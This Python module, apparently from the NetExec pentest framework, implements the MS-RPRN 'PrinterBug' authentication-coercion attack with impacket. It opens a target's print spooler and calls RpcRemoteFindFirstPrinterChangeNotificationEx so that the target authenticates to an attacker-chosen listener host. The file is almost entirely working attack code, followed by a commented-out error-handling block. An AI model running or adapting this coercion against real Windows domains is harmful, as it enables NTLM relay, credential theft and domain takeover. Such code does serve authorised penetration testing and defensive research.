from impacket.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB, RpcRemoteFindFirstPrinterChangeNotificationEx, hRpcOpenPrinter

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


def request(dce, listener, target):
    resp = hRpcOpenPrinter(dce, f"\\\\{target}\x00")

    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
    request = RpcRemoteFindFirstPrinterChangeNotificationEx()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = PRINTER_CHANGE_ADD_JOB
    request["pszLocalMachine"] = f"\\\\{listener}\x00"
    request["fdwOptions"] = 0x00000000
    request["dwPrinterLocal"] = 0
    dce.request(request)

"""

try:
    resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
except Exception as e:
    if str(e).find("Broken pipe") >= 0:
        # The connection timed-out. Let's try to bring it back next round
        self.context.log.debug("Connection failed - skipping host!")
        return None
    elif str(e).upper().find("ACCESS_DENIED"):
        # We're not admin, bye
        self.context.log.debug("Access denied - RPC call was denied")
        return None
"""